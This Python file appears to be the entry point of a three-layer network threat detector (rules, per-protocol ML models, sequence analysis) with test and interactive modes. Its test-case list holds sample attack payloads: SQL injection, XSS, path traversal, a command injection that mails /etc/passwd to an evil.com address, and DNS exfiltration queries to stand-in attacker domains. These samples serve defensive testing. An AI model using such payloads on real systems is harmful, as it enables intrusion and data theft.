"""
Sentinel ML Engine v2.0 - Main Integration
Combines all layers into complete threat detection system
"""

import sys
import time
import redis
import argparse
from rules import RuleBasedFilter
from model import MLAnomalyDetector
from sequence_analyser import SequenceAnalyzer
import config


class SentinelMLEngine:
    """
    Complete Sentinel ML Engine
    Three-layer architecture:
    1. Rule-Based Filter (fast, known patterns)
    2. ML Anomaly Detection (unknown threats)
    3. Sequence Analysis (multi-step attacks)
    """
    
    def __init__(self, use_redis=True):
        """Initialize all components"""
        print("[INFO] Initializing Sentinel ML Engine v2.0...")
        
        # Layer 1: Rule-Based Filter
        print("[INFO] Loading Rule-Based Filter (Layer 1)...")
        self.rule_filter = RuleBasedFilter()
        
        # Layer 2: ML Anomaly Detectors (one per protocol)
        print("[INFO] Loading ML Anomaly Detectors (Layer 2)...")
        self.ml_detectors = {}
        for protocol, filename in [
            ("HTTP", "sentinel_model_http.pkl"),
            ("SSH",  "sentinel_model_ssh.pkl"),
            ("DNS",  "sentinel_model_dns.pkl"),
        ]:
            try:
                detector = MLAnomalyDetector(protocol=protocol)
                detector.load_model(filename=filename)
                self.ml_detectors[protocol] = detector
                print(f"[SUCCESS] Loaded pre-trained {protocol} model")
            except Exception as e:
                print(f"[WARNING] No pre-trained {protocol} model found.")
                print(f"[WARNING] Run train_model.py to generate {filename}")
                self.ml_detectors[protocol] = None
        
        # Layer 3: Sequence Analyzer
        print("[INFO] Initializing Sequence Analyzer (Layer 3)...")
        redis_client = None
        if use_redis:
            try:
                redis_client = redis.Redis(
                    host=config.REDIS_HOST,
                    port=config.REDIS_PORT,
                    db=config.REDIS_DB,
                    decode_responses=True
                )
                redis_client.ping()
                print("[SUCCESS] Connected to Redis for sequence tracking")
            except Exception as e:
                print(f"[WARNING] Redis connection failed: {e}")
                print("[WARNING] Using in-memory storage (not distributed)")
        
        self.sequence_analyzer = SequenceAnalyzer(redis_client=redis_client)
        
        print("[SUCCESS] Sentinel ML Engine v2.0 ready!\n")
    
    def analyze(self, payload, ip_address="unknown", protocol="HTTP"):
        """
        Analyze a payload through all three layers
        
        Args:
            payload: String payload to analyze
            ip_address: Source IP address
            protocol: Protocol type (HTTP, DNS, SSH, etc.)
        
        Returns:
            dict: Complete analysis result
        """
        start_time = time.time()
        
        # Track in sequence analyzer
        self.sequence_analyzer.track_payload(ip_address, payload)
        
        # LAYER 1: Rule-Based Filter (fastest)
        rule_result = self.rule_filter.check(payload)
        
        if rule_result['is_malicious']:
            # Known bad pattern detected - instant block
            processing_time = (time.time() - start_time) * 1000  # ms
            
            return {
                'is_malicious': True,
                'confidence': rule_result['confidence'],
                'threat_level': 'CRITICAL',
                'detection_layer': 'Layer 1 (Rules)',
                'attack_type': rule_result['attack_type'],
                'matched_rule': rule_result['matched_rule'],
                'mitre_attack': self.rule_filter.map_to_mitre(payload),
                'processing_time_ms': processing_time,
                'ip_address': ip_address,
            }
        
        # LAYER 2: ML Anomaly Detection (if rules passed)
        # Route to the correct protocol model
        ml_result = None
        ml_detector = self.ml_detectors.get(protocol.upper())
        if ml_detector and ml_detector.is_trained:
            ml_result = ml_detector.predict(payload)
            
            if ml_result['is_malicious'] and ml_result['confidence'] > config.ANOMALY_SCORE_THRESHOLD:
                # ML detected anomaly
                processing_time = (time.time() - start_time) * 1000
                
                return {
                    'is_malicious': True,
                    'confidence': ml_result['confidence'],
                    'threat_level': 'HIGH',
                    'detection_layer': 'Layer 2 (ML)',
                    'attack_type': 'Unknown/Novel Attack',
                    'anomaly_score': ml_result['anomaly_score'],
                    'mitre_attack': self.rule_filter.map_to_mitre(payload),
                    'processing_time_ms': processing_time,
                    'ip_address': ip_address,
                    'protocol': protocol,
                }
        
        # LAYER 3: Sequence Analysis (check attack campaigns)
        sequence_features = self.sequence_analyzer.analyze_sequence(ip_address)
        
        # Check for sequential attack patterns
        is_sequential_attack = (
            sequence_features['seq_recon_to_exploit'] == 1 or
            sequence_features['seq_escalation_detected'] == 1 or
            sequence_features['seq_attack_velocity'] > 20  # >20 requests/min
        )
        
        if is_sequential_attack:
            processing_time = (time.time() - start_time) * 1000
            
            return {
                'is_malicious': True,
                'confidence': 0.85,
                'threat_level': 'HIGH',
                'detection_layer': 'Layer 3 (Sequence)',
                'attack_type': 'Multi-Stage Attack Campaign',
                'sequence_features': sequence_features,
                'mitre_attack': self.rule_filter.map_to_mitre(payload),
                'processing_time_ms': processing_time,
                'ip_address': ip_address,
            }
        
        # No threat detected
        processing_time = (time.time() - start_time) * 1000
        
        return {
            'is_malicious': False,
            'confidence': 0.0,
            'threat_level': 'NONE',
            'detection_layer': 'All layers passed',
            'attack_type': None,
            'processing_time_ms': processing_time,
            'ip_address': ip_address,
        }
    
    def get_statistics(self):
        """Get statistics from all layers"""
        stats = {
            'rule_filter': self.rule_filter.get_stats(),
            'sequence_analyzer': {
                'tracked_ips': len(self.sequence_analyzer.get_all_tracked_ips())
            }
        }
        
        # Per-protocol ML model stats
        for protocol, detector in self.ml_detectors.items():
            if detector:
                stats[f'ml_detector_{protocol.lower()}'] = detector.get_stats()
        
        return stats
    
    def print_result(self, result):
        """Pretty print analysis result"""
        print("\n" + "="*80)
        
        if result['is_malicious']:
            print(f"🚨 THREAT DETECTED - {result['threat_level']}")
        else:
            print("✓ CLEAN - No Threat Detected")
        
        print("="*80)
        
        print(f"IP Address:       {result['ip_address']}")
        print(f"Detection Layer:  {result['detection_layer']}")
        print(f"Confidence:       {result['confidence']:.2%}")
        
        if result['is_malicious']:
            print(f"Attack Type:      {result['attack_type']}")
            
            if 'matched_rule' in result:
                print(f"Matched Rule:     {result['matched_rule']}")
            
            if 'anomaly_score' in result:
                print(f"Anomaly Score:    {result['anomaly_score']:.3f}")
            
            if 'mitre_attack' in result and result['mitre_attack']:
                print(f"MITRE ATT&CK:     {', '.join(result['mitre_attack'])}")
            
            if 'sequence_features' in result:
                print(f"Sequence Features:")
                for key, value in result['sequence_features'].items():
                    print(f"  {key}: {value}")
        
        print(f"\nProcessing Time:  {result['processing_time_ms']:.2f} ms")
        print("="*80)


def test_mode(engine):
    """Run engine in test mode with sample payloads"""
    print("\n" + "="*80)
    print("SENTINEL ML ENGINE v2.0 - TEST MODE")
    print("="*80)
    
    test_cases = [
        # (description, payload, ip_address, protocol)
        # ── HTTP ──────────────────────────────────────────────────────────────
        ("Normal web request",   "GET /index.html HTTP/1.1",                   "192.168.1.10", "HTTP"),
        ("SQL Injection",        "admin' OR '1'='1'--",                        "10.0.0.50",    "HTTP"),
        ("XSS attack",           "<script>alert('XSS')</script>",              "10.0.0.50",    "HTTP"),
        ("Normal search query",  "search?q=python tutorials",                  "192.168.1.11", "HTTP"),
        ("Path traversal",       "../../../../etc/passwd",                     "10.0.0.51",    "HTTP"),
        ("Command injection",    "; cat /etc/passwd | mail hacker@evil.com",   "10.0.0.52",    "HTTP"),
        ("Normal API call",      "POST /api/users {name: 'John'}",             "192.168.1.12", "HTTP"),
        ("Obfuscated SQL",       "ad'/**/OR/**/1=1--",                         "10.0.0.53",    "HTTP"),

        # ── SSH ───────────────────────────────────────────────────────────────
        ("Normal SSH banner",    "SSH-2.0-OpenSSH_9.0",                        "192.168.1.20", "SSH"),
        ("SSH brute force",      "root",                                        "10.0.0.60",    "SSH"),
        ("SSH weak cipher",      "arcfour,blowfish-cbc,3des-cbc",              "10.0.0.61",    "SSH"),
        ("SSH CVE exploit",      "libssh 0.7.3 authentication bypass",         "10.0.0.62",    "SSH"),
        ("SSH tunneling",        "direct-tcpip 127.0.0.1 8080",               "10.0.0.63",    "SSH"),

        # ── DNS ───────────────────────────────────────────────────────────────
        ("Normal DNS query",     "www.google.com",                             "192.168.1.30", "DNS"),
        ("DNS tunneling",        "aGVsbG8gd29ybGQ.tunnel.evil.com",           "10.0.0.70",    "DNS"),
        ("DGA domain",           "xkqvzmnprt.ru",                             "10.0.0.71",    "DNS"),
        ("DNS amplification",    "ANY isc.org",                               "10.0.0.72",    "DNS"),
        ("DNS TXT exfil",        "TXT c3VwZXJzZWNyZXQ.exfil.attacker.com",   "10.0.0.73",    "DNS"),
    ]
    
    for description, payload, ip, protocol in test_cases:
        print(f"\n{'='*80}")
        print(f"TEST [{protocol}]: {description}")
        print(f"Payload: {payload}")
        print(f"Source IP: {ip}")
        
        result = engine.analyze(payload, ip_address=ip, protocol=protocol)
        engine.print_result(result)
        
        time.sleep(0.1)  # Small delay for readability
    
    # Print statistics
    print("\n" + "="*80)
    print("STATISTICS")
    print("="*80)
    stats = engine.get_statistics()
    
    print("\nRule-Based Filter:")
    for key, value in stats['rule_filter'].items():
        print(f"  {key}: {value}")
    
    for protocol in ['http', 'ssh', 'dns']:
        key = f'ml_detector_{protocol}'
        if key in stats:
            print(f"\nML Detector ({protocol.upper()}):")
            for k, v in stats[key].items():
                print(f"  {k}: {v}")
    
    print(f"\nSequence Analyzer:")
    print(f"  Tracked IPs: {stats['sequence_analyzer']['tracked_ips']}")
    
    print("="*80)


def interactive_mode(engine):
    """Run engine in interactive mode"""
    print("\n" + "="*80)
    print("SENTINEL ML ENGINE v2.0 - INTERACTIVE MODE")
    print("="*80)
    print("\nEnter payloads to analyze (or 'quit' to exit)")
    print("Format:   <payload>")
    print("Optional: <payload>|<ip_address>|<protocol>")
    print("Protocol: HTTP (default), SSH, DNS\n")
    
    while True:
        try:
            user_input = input("\n> ").strip()
            
            if user_input.lower() in ['quit', 'exit', 'q']:
                break
            
            if not user_input:
                continue
            
            # Parse input — support payload|ip|protocol format
            parts = user_input.split('|')
            payload  = parts[0].strip()
            ip       = parts[1].strip() if len(parts) > 1 else "unknown"
            protocol = parts[2].strip().upper() if len(parts) > 2 else "HTTP"
            
            # Analyze
            result = engine.analyze(payload, ip_address=ip, protocol=protocol)
            engine.print_result(result)
            
        except KeyboardInterrupt:
            print("\n\nExiting...")
            break
        except Exception as e:
            print(f"Error: {e}")
    
    print("\nGoodbye!")


def main():
    """Main entry point"""
    parser = argparse.ArgumentParser(description='Sentinel ML Engine v2.0')
    parser.add_argument(
        '--mode',
        choices=['test', 'interactive'],
        default='test',
        help='Run mode (default: test)'
    )
    parser.add_argument(
        '--no-redis',
        action='store_true',
        help='Disable Redis (use in-memory storage)'
    )
    
    args = parser.parse_args()
    
    # Initialize engine
    engine = SentinelMLEngine(use_redis=not args.no_redis)
    
    # Run in selected mode
    if args.mode == 'test':
        test_mode(engine)
    elif args.mode == 'interactive':
        interactive_mode(engine)


if __name__ == "__main__":
    main()